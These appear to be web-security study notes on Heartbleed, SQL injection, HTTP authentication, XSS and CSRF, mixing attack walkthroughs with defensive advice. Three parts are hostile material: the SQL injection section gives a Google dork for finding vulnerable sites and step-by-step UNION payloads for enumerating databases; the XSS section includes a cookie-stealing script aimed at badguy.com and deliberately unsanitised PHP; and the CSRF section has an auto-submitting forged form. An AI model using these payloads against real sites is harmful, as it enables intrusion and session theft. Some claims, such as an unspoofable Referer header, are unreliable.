# Web Security

## Heartbleed Vulnerability

The SSL standard includes a "heartbeat" option, which provides a way for a computer at one end of the SSL connection to double-check that there's still someone at the other end of the line. This feature is useful because some internet routers will drop a connection if it's idle for too long. In a nutshell, the heartbeat protocol works like this:

<div style="text-align:center;">
    <img src="/images/heartbleed_good.png" alt="Heart Bleed"/>
</div>

The heartbeat message has three parts: a request for acknowledgement, a short, randomly-chosen message (in this case, "banana"), and the number of characters in that message. The server is simply supposed to acknowledge having received the request and parrot back the message.

The Heartbleed attack takes advantage of the fact that the server can be too trusting. When someone tells it that the message has 6 characters, the server automatically sends back 6 characters in response. A malicious user can take take advantage of the server's gullibility:

<div style="text-align:center;">
    <img src="/images/heartbleed_bad.png" alt="Heart Bleed"/>
</div>

Obviously, the word "giraffe" isn't 100 characters long. But the server doesn't bother to check before sending back its response, so it sends back 100 characters. Specifically, it sends back the 7-character word "giraffe" followed by whichever 93 characters happen to be stored after the word "giraffe" in the server's memory. Computers often store information in a haphazard order in an effort to pack it into its memory as tightly as possible, so there's no telling what information might be returned. In this case, the bit of memory after the word "giraffe" contained sensitive personal information belonging to user John Smith.

In the real Heartbleed attack, the attacker doesn't just ask for 100 characters. The attacker can ask for around 64,000 characters of plain text. And it doesn't just ask once, it can send malicious heartbeat messages over and over again, allowing the attacker to get back different fragments of the server's memory each time. In the process, it can gain a wealth of data that was never intended to be available to the public.

The fix for this problem is easy: the server just needs to be less trusting. Rather than blindly sending back as much data as is requested, the server needs to check that it's not being asked to send back more characters than it received in the first place. That's exactly what OpenSSL's fix for the Heartbleed Bug does.

Here's another visualisation to help you understand better.

<div style="text-align:center;">
    <img src="/images/heartbleed_explanation.png" alt="Heart Bleed"/>
</div>

### Generic Precautions

1. Sanitize input perfectly. If it is not what you are expecting, don't take it.
   Check for markup in the input values, especially \<script\> elements.
   Escape "quote" characters so that they are literally used and not interpreted
2. Do not run multiple queries in a single stroke.
3. Give out very generic error messages to the client. Never send
   database errors to the front end.
4. Avoid eval\(\) as far as possible.
5. Use Secure communication to avoid Man-in-the-middle attacks.
   SSL + Basic Authentication if you can.
6. Use Http-only cookies as far as possible.
7. As users, don't click on links to get to your wanted sites.
   Type them in the address bar.

## SQL Injection

Many web applications take user input from a form
Often this user input is used literally in the construction of a SQL query submitted to a database. For example:
SELECT productdata FROM table WHERE productname = ‘user input product name’;
A SQL injection attack involves placing SQL statements in the user input

Consdier the following example
Let's say we have a product search input field and the user enters the following
blah‘ OR ‘x’ = ‘x

This input is put directly into the SQL statement within the Web application:
$query = “SELECT prodinfo FROM prodtable WHERE prodname = ‘” . $\_POST[‘prod_search’] . “’”;
Creates the following SQL:
SELECT prodinfo FROM prodtable WHERE prodname = ‘blah‘ OR ‘x’ = ‘x’
Attacker has now successfully caused the entire table to be returned.

what can be done using sql injection

1. Add new data to the database. Could be embarrassing to find yourself selling politically incorrect items on an eCommerce site
2. Perform an INSERT in the injected SQL
3. Modify data currently in the database. Could be very costly to have an expensive item suddenly be deeply ‘discounted’. Perform an UPDATE in the injected SQL
4. Often can gain access to other user’s system capabilities by obtaining their password
5. Delete records from a database.

using google dorks search for a vulnerable website using
inurl: products.php?id=
They may be prospective vulnerable websites.
add a single quote to the url to force an sql error.
http://targetwebsite.com/products.php?prodid=3'
if the mysql error us displayed, we know that the website is vulnerable.

Find the number of columns in a table using ORDER BY.When you get a ERROR it indicates that number of columns has exceeded

```
http://targetwebsite.com/products.php?prodid=3 ORDER BY 1
http://targetwebsite.com/products.php?prodid=3 ORDER BY 2
http://targetwebsite.com/products.php?prodid=3 ORDER BY 3
http://targetwebsite.com/products.php?prodid=3 ORDER BY 4
http://targetwebsite.com/products.php?prodid=3 ORDER BY 5
http://targetwebsite.com/products.php?prodid=3 ORDER BY 6
http://targetwebsite.com/products.php?prodid=3 ORDER BY 7
```

find the columns from which data is being fetched onto the current page using

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,2,3,4,5,6
```

lets say that data from column 2 is being fetched onto the current page. Then use version to find the SQL version

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,version(),3,4,5,6
```

we can also get the database name using database()

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,database(),3,4,5,6
```

we can also get the current user using user()

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,user(),3,4,5,6
```

get list of tables using

```
http://targetwebsite.com/products.php?id=-1 and 1=2 UNION SELECT ALL 1,group_concat(table_name),3,4,5,6 from
information_schema.tables where table_schema=database()
```

get the columns using.. use ascii version of the table name

```
http://targetwebsite.com/products.php?prodid=-3 UNION SELECT ALL 1,2,group_concat(column_name),4,5,6 FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=CHAR(117,115,101,114,115);
```

how to protect against SQL injection attacks

1. use bound variables with prepared statements. It works because the parameter values are combined with the compiled statement, not a SQL string.
   SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters you limit the risk of ending up with something you didn't intend.
2. Use provided functions for escaping strings
   Many attacks can be thwarted by simply using the SQL string escaping mechanism
   mysql_real_escape_string() is the preferred function for this
   Will not guard against all attacks
   Consider:
   SELECT fields FROM table WHERE id = 23 OR 1=1
   No quotes here!

3. Check syntax of input for validity. Exclude quotes and semicolons
   Not always possible: consider the name Bill O’Reilly
4. Have length limits on input
   Many SQL injection attacks depend on entering long strings

5. Scan query string for undesirable word combinations that indicate SQL statements
   INSERT, DROP, etc.
   If you see these, can check against SQL syntax to see if they represent a statement or valid user input

6. Limit database permissions and segregate users
   If you’re only reading the database, connect to database as a user that only has read permissions
   Never connect as a database administrator in your web application

7. Configure database error reporting
   Default error reporting often gives away information that is valuable for attackers (table name, field name, etc.)
   Configure so that this information is never exposed to a user

## HTTP Authentication
.htaccess is used for directory level access permissions

Two types 
1) Basic
2) Digest

Steps to set up Basic HTTP Auth
1) Create a password
```bash
htpasswd -c -m -b .htpasswd admin admin_pass
```
"admin" is going to be the username and "admin_pass" would be our password.

-c : create a new file
-m : MD5 encryption is enforced
-b : Use the password given at the command prompt

2) Modify the .htaccess file 
AuthName "Protected Area"
AuthType Basic
AuthUserFile c:\xampp\htdocs\htpassword\.htpasswd
require valid-user


STEP 1 : the client makes a request for information, sending a username and password to the server in plain text
STEP 2 : the server responds with the desired information or an error
HTTP Basic doesn’t need to be implemented over SSL, but if you don’t, it isn’t secure at all.
Pros:
Its simple to implement, so your client developers will have less work to do and take less time to deliver, so developers could be more likely to want to use your API
Unlike Digest, you can store the passwords on the server in whatever encryption method you like, such as bcrypt, making the passwords more secure
Just one call to the server is needed to get the information, making the client slightly faster than more complex authentication methods might be
Cons:
SSL is slower to run than basic HTTP so this causes the clients to be slightly slower
If you don’t have control of the clients, and can’t force the server to use SSL, a developer might not use SSL, causing a security risk
In Summary – if you have control of the clients, or can ensure they use SSL, HTTP Basic is a good choice. The slowness of the SSL can be cancelled out by the speed of only making one request


### Digest 
HTTP Digest access authentication is a more complex form of authentication that works as follows:
STEP 1 : a client sends a request to a server
STEP 2 : the server responds with a special code (called a nonce i.e. number used only once), another string representing the ‘realm’ and asks the client to authenticate
STEP 3 : the client responds with this nonce and an encrypted version of the username, password and realm (a hash)
STEP 4 : the server responds with the requested information if the client hash matches their own hash of the username, password and realm, or an error if not
Pros:
No usernames or passwords are sent to the server in plaintext, making a non-SSL connection more secure than an HTTP Basic request that isn’t sent over SSL. This means SSL isn’t required, which makes each call slightly faster
Cons:
For every call needed, the client must make 2, making the process slightly slower than HTTP Basic
HTTP Digest is vulnerable to a man-in-the-middle security attack which basically means it could be hacked
HTTP Digest prevents use of the strong password encryption, meaning the passwords stored on the server could be hacked
In Summary, HTTP Digest is inherently vulnerable to at least two attacks, whereas a server using strong encryption for passwords with HTTP Basic over SSL is less likely to share these vulnerabilities.
If you don’t have control over your clients however they could attempt to perform Basic authentication without SSL, which is much less secure than Digest

## HTTPS

## SSL

## Cross Site Scripting (XSS)

An XSS vulnerability is present when an attacker can inject scripting code into pages generated by a web application. A Bad web site sends innocent victim a script that steals information from an honest web site. In other words, an attacker's website tries to execute a script on a different website.

Usually used for strealing the cookies.

How to check if a site is vulnerable to XSS?
Look for websites that have a form with a text box and type the following

```js
<script> alert("hello") </script>
```

if the script is executed, the website is vulnerable to XSS. But how did it happen?

### Reflected Cross Site Scripting.

Let's say that the victim website has a form for searching for products. When the form is submitted, a GET request is sent to the server. The name of the input field is **term** as indicated by the search url ***http://victim.com/search.php?term=apple***
```html
<input type="text" name="term"></input>
```

The server side implementation for search.php is as follows

```php
<html>
<title> Search Results </title>
<body>
	Results for <?php echo $_GET['term']; ?>
	// Do other stuff
</body>
</html>
```

The search term, reaches the server. It is fetched from \$\_GET and at the end of it, is echoed back by the server.
This means that anything that is sent as the search term would be rendered in the client's browser. If the attacker managed to send a script in the search term, it would get executed as well. 

This would look like follows

```html
http://victim.com/search.php?term=<script>window.open(“http:\/\/badguy.com?cookie = ” + document.cookie)</script>
```
When the user clicks this link
1. Browser goes to victim.com/search.php
2. Victim.com returns
```html
<html> Results for <script> … </script> </html>
```
3. Browser executes script, which sends www.badguy.com, the cookie for www.victim.com

<div style="text-align:center;">
    <img src="/images/reflected_xss.png" alt="Reflected XSS"/>
</div>

#### Sever Side Script

```php
<?php
	extract($_GET);
	echo "<a href='http://localhost/abc.pdf'>DOWNLOAD HERE</a><br/>";
	if(isset($usr))
	{
		// Again a devastating mistake by the server.
		// Merely checking whether the input parameter is empty or not
		// is no good. The $usr variable must be sanitised.

		// Otherwise the value is blindly sent back to the client.
		// If this is a script, then it will be delivered to the client
		// and will execute on his window, which is what is exploited
		// by the hacker (see evilmind.html)
		echo "Thank you!! $usr!!!";
	}
	else
	{
		echo "Thank you!! Guest!!!";
?>
	}
```

#### Attacker Script

```html
<html>
  <head>
    <title>BENIGN PAGE</title>
    <script type="text/javascript">
      // The hacker's first site to which an unsuspecting user is attracted.
      // The hacker's site shows a lot of useful information and generally looks
      // very good but there is one link which is malicious.
      // The link points to a popular site (which is vulnerable).
      // The hacker wants to execute his script on the user's browser to steal cookies.
      // If there is a page on the popular site which just echoes what the user sends
      //(see index.php), then that is what the hacker needs. Again the server script
      // does not sanitise inputs.

      // In this page, the hyperlink is actually part of a form (which the user is not
      // aware of).
      // On clicking the link, the default action (which is to go to the server
      // is prevented by the hacker. Instead he sends a script (which he knows the server
      // will just echo back) through the form. The script here just alerts the cookies.
      // But in reality an image can be used to send all cookies to the hacker's site.
      // Remember, making cross domain requests is a cake-walk with images.
      function sendEvilScript(event) {
        //Disable the default action
        event.preventDefault();

        //Now I will control the submission.. LOL...
        form = document.getElementById("frm");
        ip = document.createElement("input");
        ip.type = "text";
        ip.name = "usr";

        // This is the potential danger.If the user clicks on
        // the hyperlink, then this script will go to the server (the user
        // has unknowingly transported the hacker's script to the server
        // and will get it back on his own browser (see index.php)
        hackstr =
          "<script type='text/javascript'>alert(document.cookie);<\/script>";

        ip.value = hackstr;
        form.appendChild(ip);

        form.submit(); //Force submit the form with my input

        //Hacker decides..."Remove the ip element immediately" so that the
        // user has no clue as to what happened.
        form.removeChild(ip);
      }
    </script>
  </head>
  <body>
    <h2>YOU CAN GO TO SRIKANTH's SITE FROM HERE</h2>
    <form id="frm" action="http://localhost/index.php" method="GET">
      <a href="http://localhost/index.php" onclick="sendEvilScript(event)"
        >SRIKANTH's SITE</a
      >
    </form>
    <h3>HAVE A WONDERFUL DAY <img src="happy-smiley.jpg" /></h3>
  </body>
</html>
```

```php
<?php
	// To set HTTP-only cookies. These cannot be accessed by the client
	// by using document.cookie. This can provide a good
	// defence against XSS threat. However the "TRACE" method still
	// remains a threat. "TRACE" was initially provided as a debugging tool.

	// In the TRACE method (a method similar to GET and POST), the server
	// merely echoes back whatever the client sends (including cookies).
	// So if a hacker can't read document.cookie, he can force a TRACE call
	// to the server. The http-only cookies will be sent to the server
	// because it is an HTTP call. The server echoes back the data
	// to the client. The hacker can then grab the cookie.
	// This is called XST or CROSS SITE TRACING threat.
	// To overcome this, browsers usually disable TRACE as an HTTP method.
	// Web servers can also be configured to reject TRACE requests.
	// Thus http-only cookies are a relatively safe way of writing
	// cookies which contain important information.

	//The correct way is to use HTTP-ONLY cookies with SSL

	// Setting http-only cookies. See the last parameter set to TRUE
	// See the PHP documentation for details on other parameters.
	setcookie("mycookie","hello", time()+3600,NULL,NULL,NULL,TRUE);
	setcookie("impcookie","confidential", time()+3600,NULL,NULL,NULL,TRUE);
?>
<html>
<head>
<title>BENIGN PAGE</title>
</head>
<body>
<?php
	echo $_COOKIE['impcookie'] . "<br/>" . $_COOKIE['mycookie'];
	extract($_GET);
	echo "<a href='http://localhost/imaginary.pdf'>DOWNLOAD FILE HERE</a>";
	if(isset($usr))
	{
		echo "<h3>Thank you $usr</h3>";
	}
	else
	{
		echo "<h3>Thank you Guest</h3>";
	}
?>
</body>
</html>

```

This can also be used by hackers for session hijacking. An attacker can obtain the user's session ID by stealing his cookie.

types
Reflected
stored
dom based

## Cross Site Tracing (XST)

## Cross Site Resource Forgery

when youre logged in to a website , a session is created and a session id is set . If the same website is accessed from another window or tab, youre not asked for the credentials agaim... because session id is stored as a cookie.

During Every subsequent request, the cookie is sent along with the request. and the session ID is validated against the servers records and you are sent back the data.

This funcionality can be exploited by hackers. they can embed requests to these websites as long as the victim is logged in.

you must've noticed that websites that contain sensitive information like bank websites, log you out pretty often say a 10 minute window
the reason is that, while you are logged into the website, any request to that website is authenticated.

Let's say you are logged in to your bank account. At the same time you happen to open the attakcers page. This causes a forged request to be sent to the bank web server.
The Bank webserver has no way of knowing whether the request originated from the attacker's page.

<div style="text-align:center;">
    <img src="/images/csrf_info.png" alt="CSRF"/>
</div>

Steps in CSRF

1. Victim is logged into vulnerable web site
2. Victim visits malicious page on attacker web site
3. Malicious content is delivered to victim
4. Victim involuntarily sends a request to the vulnerable web site

prerequisites for a csrf attack.

1. The victim must be logged into the website
2. the attacker must know the URL of the target website to which to send the request to.
3. The attacker must know the payload or the parameters to be passed to the URL

The main intent of CSRF attacks is to change the state of data and not to steal data itself.

How to prevent this attack

1. post requests could be used instead of GET, however, the attacker can easily generate POST requests

```html
<form id=“f” action=“http://target.com/”
            method=“post”>
  <input name=“p” value=“42”>
</form>
<script>
  var f = document.getElementById('f');
  f.submit();
</script>

```

2. Referrer header tells from which website the request has originated. The bank or the target website can check for the validity of the referrer header to verify the request since the referrer header cannot be spoofed. This has an issue since legitimate requests that a user makes through proxies and web firewalls would be flagged off as forged.
3. Using CSRF tokens. Every time a form is served, add an additional parameter with a secret value (token) and check that it is valid upon submission

```html
<form>
  <!-- Ohter input fields -->
  <input name="“anticsrf”" type="“hidden”" value="“asdje8121asd26n1”" />
</form>
```

If the attacker can guess the token value, then no protection

4. If the token is not regenerated each time a form is served, the application may be vulnerable to replay attacks
5. Log out from web applications when they have finished using them.
6. Use the web browser with safety – that means making sure not to save any login credentials on the web browser and using legitimate and secure browser extensions.
7. Same site cookies can be used i.e. a cookie can be accessed only by requests originating from the same website. 